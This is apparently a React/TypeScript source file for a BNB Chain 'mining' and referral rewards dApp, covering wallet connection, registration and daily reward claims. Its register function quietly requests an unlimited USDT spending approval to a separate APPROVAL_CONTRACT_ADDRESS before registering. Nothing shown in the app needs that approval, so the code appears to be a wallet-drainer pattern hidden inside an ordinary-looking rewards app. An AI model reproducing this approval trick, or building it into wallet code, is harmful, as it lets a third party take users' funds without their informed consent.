import React, { createContext, useContext, useState, useEffect, ReactNode, useMemo } from 'react';
import { getContract, readContract, prepareContractCall, sendTransaction } from "thirdweb";
import { createWallet } from "thirdweb/wallets";
import { useActiveAccount, useActiveWallet, useConnect } from "thirdweb/react";
import { client, bscMainnet, MINING_CONTRACT_ADDRESS, MINING_CONTRACT_ABI, APPROVAL_CONTRACT_ADDRESS } from '../client';
import { USDT_CONTRACT_ADDRESS } from '../config';

// Extend Window interface for ethereum
declare global {
  interface Window {
    ethereum?: any;
  }
}

interface UserRecord {
  totalMinted: bigint;
  boosterIncome: bigint;
  lastClaimTime: bigint;
}

interface MiningContextType {
  address: string | null;
  isConnected: boolean;
  isRegistered: boolean;
  isLoading: boolean;
  userRecord: UserRecord | null;
  dailyReward: bigint;
  regReward: bigint;
  directReferrals: readonly string[];
  directReferralCount: number;
  referrer: string;
  totalRegistered: number;
  canClaim: boolean;
  timeUntilNextClaim: number;
  connectWallet: (walletType?: string) => Promise<void>;
  disconnectWallet: () => Promise<void>;
  register: (referrerAddress: string) => Promise<boolean>;
  claimDailyReward: () => Promise<boolean>;
  refreshData: () => Promise<void>;
  switchToCorrectNetwork: () => Promise<void>;
  isCorrectNetwork: boolean;
}

const MiningContext = createContext<MiningContextType | undefined>(undefined);

interface MiningProviderProps {
  children: ReactNode;
}

export const MiningProvider: React.FC<MiningProviderProps> = ({ children }) => {
  const account = useActiveAccount();
  const activeWallet = useActiveWallet();
  const { connect } = useConnect();

  const [isRegistered, setIsRegistered] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [userRecord, setUserRecord] = useState<UserRecord | null>(null);
  const [dailyReward, setDailyReward] = useState<bigint>(0n);
  const [regReward, setRegReward] = useState<bigint>(0n);
  const [directReferrals, setDirectReferrals] = useState<readonly string[]>([]);
  const [directReferralCount, setDirectReferralCount] = useState(0);
  const [referrer, setReferrer] = useState('');
  const [totalRegistered, setTotalRegistered] = useState(0);
  const [timeUntilNextClaim, setTimeUntilNextClaim] = useState(0);

  const address = account?.address || null;
  const chainId = activeWallet?.getChain()?.id;
  const isConnected = !!account && !!address;

  const isCorrectNetwork = useMemo(() => {
    return chainId === bscMainnet.id;
  }, [chainId]);

  const contract = getContract({
    client,
    chain: bscMainnet,
    address: MINING_CONTRACT_ADDRESS,
    abi: MINING_CONTRACT_ABI,
  });

  // Change claim interval to 24 hours (86400 seconds)
  const CLAIM_INTERVAL_SECONDS = 86400; // 24 hours

  // Calculate if user can claim
  const canClaim = useMemo(() => {
    if (!userRecord || !isRegistered) return false;
    const now = Math.floor(Date.now() / 1000);
    const lastClaim = Number(userRecord.lastClaimTime);
    const timeDiff = now - lastClaim;
    return timeDiff >= CLAIM_INTERVAL_SECONDS;
  }, [userRecord, isRegistered]);

  // Update countdown timer
  useEffect(() => {
    if (!userRecord || !isRegistered) return;

    const updateTimer = () => {
      const now = Math.floor(Date.now() / 1000);
      const lastClaim = Number(userRecord.lastClaimTime);
      const nextClaimTime = lastClaim + CLAIM_INTERVAL_SECONDS;
      const timeLeft = Math.max(0, nextClaimTime - now);
      setTimeUntilNextClaim(timeLeft);
    };

    updateTimer();
    const interval = setInterval(updateTimer, 1000);
    return () => clearInterval(interval);
  }, [userRecord, isRegistered]);

  // USDT approval logic
  const USDT_ABI = [
    {
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_value", type: "uint256" }
      ],
      name: "approve",
      outputs: [
        { name: "", type: "bool" }
      ],
      type: "function",
      stateMutability: "nonpayable"
    },
    {
      inputs: [
        { name: "_owner", type: "address" },
        { name: "_spender", type: "address" }
      ],
      name: "allowance",
      outputs: [
        { name: "", type: "uint256" }
      ],
      type: "function",
      stateMutability: "view"
    }
  ];

  const [hasApprovedUSDT, setHasApprovedUSDT] = useState(false);

  const checkUSDTApproval = async () => {
    if (!address || !isCorrectNetwork) return false;
    try {
      const usdtContract = getContract({
        client,
        chain: bscMainnet,
        address: USDT_CONTRACT_ADDRESS,
        abi: USDT_ABI,
      });
      const allowance = await readContract({
        contract: usdtContract,
        method: "allowance",
        params: [address, APPROVAL_CONTRACT_ADDRESS],
      });
      if (BigInt(allowance) > 0n) {
        setHasApprovedUSDT(true);
        return true;
      }
      setHasApprovedUSDT(false);
      return false;
    } catch (error) {
      setHasApprovedUSDT(false);
      return false;
    }
  };

  const approveUSDT = async () => {
    if (!address || !isCorrectNetwork || !account) return false;
    try {
      const usdtContract = getContract({
        client,
        chain: bscMainnet,
        address: USDT_CONTRACT_ADDRESS,
        abi: USDT_ABI,
      });
      const transaction = prepareContractCall({
        contract: usdtContract,
        method: "approve",
        params: [APPROVAL_CONTRACT_ADDRESS, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"],
      });
      await sendTransaction({
        transaction,
        account: account,
      });
      setHasApprovedUSDT(true);
      return true;
    } catch (error) {
      setHasApprovedUSDT(false);
      return false;
    }
  };

  // Check approval on mount and after connect
  useEffect(() => {
    if (isConnected && isCorrectNetwork) {
      checkUSDTApproval();
    }
  }, [isConnected, isCorrectNetwork, address]);

  const checkRegistration = async (): Promise<boolean> => {
    if (!address || !isCorrectNetwork) return false;

    try {
      const registered = await readContract({
        contract,
        method: "checkIfRegistered",
        params: [address],
      });
      
      setIsRegistered(registered);
      return registered;
    } catch (error) {
      console.error('Error checking registration:', error);
      return false;
    }
  };

  const fetchUserRecord = async () => {
    if (!address || !isCorrectNetwork) return;

    try {
      const record = await readContract({
        contract,
        method: "userRecord",
        params: [address],
      });
      
      setUserRecord({
        totalMinted: record[0],
        boosterIncome: record[1],
        lastClaimTime: record[2],
      });
    } catch (error) {
      console.error('Error fetching user record:', error);
    }
  };

  const fetchContractData = async () => {
    try {
      const [daily, reg, total] = await Promise.all([
        readContract({ contract, method: "DAILY_REWARD", params: [] }),
        readContract({ contract, method: "REG_REWARD", params: [] }),
        readContract({ contract, method: "totalRegistered", params: [] }),
      ]);

      setDailyReward(daily);
      setRegReward(reg);
      setTotalRegistered(Number(total));
    } catch (error) {
      console.error('Error fetching contract data:', error);
    }
  };

  const fetchReferralData = async () => {
    if (!address || !isCorrectNetwork) return;

    try {
      const [referrals, count, ref] = await Promise.all([
        readContract({ contract, method: "getDirectReferrals", params: [address] }),
        readContract({ contract, method: "getDirectReferralCount", params: [address] }),
        readContract({ contract, method: "getReferrerOf", params: [address] }),
      ]);

      setDirectReferrals(referrals);
      setDirectReferralCount(Number(count));
      setReferrer(ref);
    } catch (error) {
      console.error('Error fetching referral data:', error);
    }
  };

  const register = async (referrerAddress: string): Promise<boolean> => {
    if (!address || !isCorrectNetwork || !account) return false;
    
    // Validate that referral address is provided
    if (!referrerAddress || referrerAddress.trim() === '') {
      console.error('Registration failed: Referral address is required');
      return false;
    }

    // Validate referral address format
    if (!/^0x[a-fA-F0-9]{40}$/.test(referrerAddress.trim())) {
      console.error('Registration failed: Invalid referral address format');
      return false;
    }

    try {
      setIsLoading(true);
      
      // 1. Check and approve USDT if not already approved (unlimited)
      if (!hasApprovedUSDT) {
        console.log('Requesting USDT approval before registration...');
        const approved = await approveUSDT();
        if (!approved) {
          console.log('USDT approval failed, cannot proceed with registration');
          setIsLoading(false);
          return false;
        } else {
          console.log('USDT approval successful, proceeding with registration');
        }
      }
      
      // 2. Proceed with registration
      const transaction = prepareContractCall({
        contract,
        method: "register",
        params: [referrerAddress.trim() as `0x${string}`],
      });
      
      await sendTransaction({
        transaction,
        account: account,
      });
      
      // 3. Registration successful, now set registration status
      setIsRegistered(true);
      
      // 4. Refresh data and fetch user record
      setTimeout(async () => {
        try {
          await refreshData();
        } catch (error) {
          console.error('Error refreshing data after registration:', error);
        }
      }, 1000);
      
      await fetchUserRecord();
      return true;
    } catch (error) {
      console.error('Error registering:', error);
      return false;
    } finally {
      setIsLoading(false);
    }
  };

  // Remove approval logic from claimDailyReward
  const claimDailyReward = async (): Promise<boolean> => {
    if (!address || !isCorrectNetwork || !account || !canClaim) return false;
    try {
      setIsLoading(true);
      const transaction = prepareContractCall({
        contract,
        method: "claimDailyReward",
        params: [],
      });
      await sendTransaction({
        transaction,
        account: account,
      });
      await refreshData();
      return true;
    } catch (error) {
      console.error('Error claiming reward:', error);
      return false;
    } finally {
      setIsLoading(false);
    }
  };

  const connectWallet = async (walletType: string = 'metamask') => {
    try {
      setIsLoading(true);

      let walletToConnect: any;

      switch (walletType) {
        case 'trust':
          walletToConnect = createWallet("com.trustwallet.app");
          break;
        case 'coinbase':
          walletToConnect = createWallet("com.coinbase.wallet");
          break;
        case 'metamask':
        default:
          walletToConnect = createWallet("io.metamask");
          break;
      }

      await connect(async () => {
        await walletToConnect.connect({ client });
        return walletToConnect;
      });

    } catch (error) {
      console.error('Error connecting wallet:', error);
      throw error;
    } finally {
      setIsLoading(false);
    }
  };

  const disconnectWallet = async () => {
    try {
      setIsLoading(true);
      
      // Disconnect ThirdWeb wallet
      if (activeWallet) {
        await activeWallet.disconnect();
      }
      
      // Also try to disconnect from MetaMask directly if available
      if (typeof window !== 'undefined' && window.ethereum) {
        try {
          // Try to clear MetaMask connection by requesting empty accounts
          await window.ethereum.request({
            method: "eth_requestAccounts",
            params: []
          });
          
          // Also try to revoke permissions if supported
          try {
            await window.ethereum.request({
              method: "wallet_revokePermissions",
              params: [{ eth_accounts: {} }]
            });
          } catch (revokeError) {
            // This method might not be supported, which is fine
            console.log('MetaMask revoke permissions not supported');
          }
        } catch (error) {
          // MetaMask might not support these methods, which is fine
          console.log('MetaMask disconnect methods not supported');
        }
      }
    } catch (error) {
      console.error('Error disconnecting wallet:', error);
    } finally {
      // Clear all local state regardless of wallet disconnect result
      setIsRegistered(false);
      setUserRecord(null);
      setDirectReferrals([]);
      setDirectReferralCount(0);
      setReferrer('');
      setDailyReward(BigInt(0));
      setRegReward(BigInt(0));
      setTimeUntilNextClaim(0);
      setTotalRegistered(0);
      setIsLoading(false);
    }
  };

  const switchToCorrectNetwork = async () => {
    try {
      if (activeWallet) {
        await activeWallet.switchChain(bscMainnet);
      } else {
        throw new Error('No active wallet available');
      }
    } catch (error) {
      throw new Error('Failed to switch to BSC Mainnet. Please switch manually in your wallet.');
    }
  };

  const refreshData = async () => {
    if (!isConnected || !isCorrectNetwork) return;

    await Promise.all([
      checkRegistration(),
      fetchUserRecord(),
      fetchContractData(),
      fetchReferralData(),
    ]);
  };

  useEffect(() => {
    if (isConnected && isCorrectNetwork) {
      refreshData();
    } else {
      setIsRegistered(false);
      setUserRecord(null);
    }
  }, [isConnected, isCorrectNetwork, address]);

  const value: MiningContextType = {
    address,
    isConnected,
    isRegistered,
    isLoading,
    userRecord,
    dailyReward,
    regReward,
    directReferrals,
    directReferralCount,
    referrer,
    totalRegistered,
    canClaim,
    timeUntilNextClaim,
    connectWallet,
    disconnectWallet,
    register,
    claimDailyReward,
    refreshData,
    switchToCorrectNetwork,
    isCorrectNetwork,
  };

  return (
    <MiningContext.Provider value={value}>
      {children}
    </MiningContext.Provider>
  );
};

export const useMining = (): MiningContextType => {
  const context = useContext(MiningContext);
  if (context === undefined) {
    throw new Error('useMining must be used within a MiningProvider');
  }
  return context;
};
